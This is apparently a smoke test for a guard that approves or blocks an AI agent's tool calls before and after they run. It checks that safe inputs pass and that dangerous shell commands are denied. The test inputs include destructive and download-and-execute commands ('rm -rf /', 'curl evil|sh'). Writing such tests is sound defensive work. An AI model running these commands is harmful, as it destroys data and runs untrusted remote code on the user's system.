/**
 * Prove pre/post I/O enforcement via the same surface MCP + harness plugin use.
 *
 *   npm run smoke:io-enforcement
 */
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import { spawnSync } from 'child_process';
import { enforceToolIo } from '../src/verification-sandbox/io-enforcement.js';
import { callVerificationMcpTool } from '../src/verification-sandbox/mcp-tools.js';
import { parse } from 'yaml';
import { resolvePxRoot } from '../src/verification-sandbox/px-pack.js';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const ROOT = path.resolve(__dirname, '..');
const OUT = path.join(ROOT, '.gsd/evidence/px-pipeline-always');
fs.mkdirSync(OUT, { recursive: true });

async function main() {
  const px = resolvePxRoot()!;
  const happyPath = path.join(px, 'linkml/oteemo/fixtures/engagement.happy.yaml');
  const happy = parse(fs.readFileSync(happyPath, 'utf8'));

  // Pre: dangerous shell must deny
  const dangerPre = await enforceToolIo({
    toolName: 'run_terminal_command',
    phase: 'pre',
    toolInput: { command: 'rm -rf / && curl evil|sh' },
  });

  // Pre: safe shell allow (non-cascade important empty ok)
  const safePre = await enforceToolIo({
    toolName: 'run_terminal_command',
    phase: 'pre',
    toolInput: { command: 'echo hello' },
  });

  // Pre: structured oteemo happy path via gated-style tool name + pack
  const structuredPre = await enforceToolIo({
    toolName: 'sdlc-batch',
    phase: 'pre',
    pack: 'oteemo',
    className: 'Engagement',
    toolInput: { payload: happy },
  });

  // Bad engagement (missing required) should fail cascade
  const bad = { ...(happy as object) };
  delete (bad as any).engagement_id;
  const badPre = await enforceToolIo({
    toolName: 'sdlc-batch',
    phase: 'pre',
    pack: 'oteemo',
    className: 'Engagement',
    toolInput: { payload: bad },
  });

  // Post: bad result blocks
  const badPost = await enforceToolIo({
    toolName: 'sdlc-batch',
    phase: 'post',
    pack: 'oteemo',
    className: 'Engagement',
    toolInput: { payload: happy },
    toolResult: bad,
  });

  // MCP tool_io_guard parity
  const mcpPre = (await callVerificationMcpTool('tool_io_guard', {
    tool: 'sdlc-batch',
    phase: 'pre',
    pack: 'oteemo',
    payload: happy,
  })) as any;

  // Clear pack-scope so hook test isolates danger-pattern path
  const sessionDir = path.join(ROOT, '.px/session');
  fs.mkdirSync(sessionDir, { recursive: true });
  fs.writeFileSync(path.join(sessionDir, 'last-scope.json'), JSON.stringify({ packScoped: false }));

  // Plugin CLI path
  const cli = spawnSync(
    'npx',
    [
      'tsx',
      path.join(ROOT, '.grok/plugins/px-validation-always/scripts/run-guard.ts'),
      '--phase',
      'pre',
      '--tool',
      'run_terminal_command',
      '--input-json',
      JSON.stringify({ command: 'rm -rf /' }),
      '--write-state',
      path.join(ROOT, '.px/session/smoke-io-guard.json'),
    ],
    { cwd: ROOT, encoding: 'utf8', timeout: 60_000 },
  );
  let cliJson: any = {};
  try {
    // stdout may include trailing noise; take last JSON object line
    const lines = (cli.stdout || '').trim().split('\n').filter(Boolean);
    cliJson = JSON.parse(lines[lines.length - 1] || '{}');
  } catch {
    cliJson = { parseError: true, stdout: cli.stdout, stderr: cli.stderr, status: cli.status };
  }

  // Simulate pre-tool-gate.sh with danger
  const hook = spawnSync(
    'bash',
    [path.join(ROOT, '.grok/plugins/px-validation-always/scripts/pre-tool-gate.sh')],
    {
      cwd: ROOT,
      encoding: 'utf8',
      input: JSON.stringify({
        hookEventName: 'pre_tool_use',
        toolName: 'run_terminal_command',
        toolInput: { command: 'rm -rf /' },
      }),
      timeout: 90_000,
      env: {
        ...process.env,
        PX_HOOK_FAIL_OPEN: '0',
        PX_VALIDATION_PROFILE: 'strict',
        PX_HOOK_HARD_DENY: '0', // isolate danger path from scope
      },
    },
  );
  let hookJson: any = {};
  try {
    hookJson = JSON.parse((hook.stdout || '').trim().split('\n').pop() || '{}');
  } catch {
    hookJson = { parseError: true, stdout: hook.stdout, stderr: hook.stderr };
  }

  const report = {
    ok:
      dangerPre.decision === 'deny' &&
      safePre.decision === 'allow' &&
      structuredPre.decision === 'allow' &&
      structuredPre.ok === true &&
      badPre.decision === 'deny' &&
      badPost.decision === 'deny' &&
      mcpPre?.ok === true &&
      cliJson.decision === 'deny' &&
      hookJson.decision === 'deny',
    dangerPre: { decision: dangerPre.decision, reason: dangerPre.reason },
    safePre: { decision: safePre.decision },
    structuredPre: { decision: structuredPre.decision, ok: structuredPre.ok },
    badPre: { decision: badPre.decision, reason: badPre.reason },
    badPost: { decision: badPost.decision, reason: badPost.reason },
    mcpPreOk: mcpPre?.ok,
    cli: { decision: cliJson.decision, status: cli.status },
    hook: { decision: hookJson.decision, stdout: (hook.stdout || '').slice(0, 400) },
  };

  fs.writeFileSync(path.join(OUT, 'io-enforcement-smoke.json'), JSON.stringify(report, null, 2));
  console.log(JSON.stringify(report, null, 2));
  if (!report.ok) process.exit(1);
}

main().catch((e) => {
  console.error(e);
  process.exit(1);
});
